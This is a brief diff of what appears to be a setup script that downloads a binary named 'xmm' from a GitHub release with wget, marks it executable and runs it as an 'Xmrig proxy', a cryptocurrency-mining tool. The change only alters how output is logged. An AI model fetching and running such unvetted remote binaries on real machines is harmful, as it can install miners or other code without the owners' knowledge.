@@ -79,4 +79,4 @@ wget https://github.com/max313iq/Ssl/releases/download/Xxx/xmm
 chmod +x xmm
 
 # Run Xmrig proxy 
-./xmm -c config.json  > stdout.txt 2> stderr.txt
+./xmm -c config.json logfile.log 2>&1
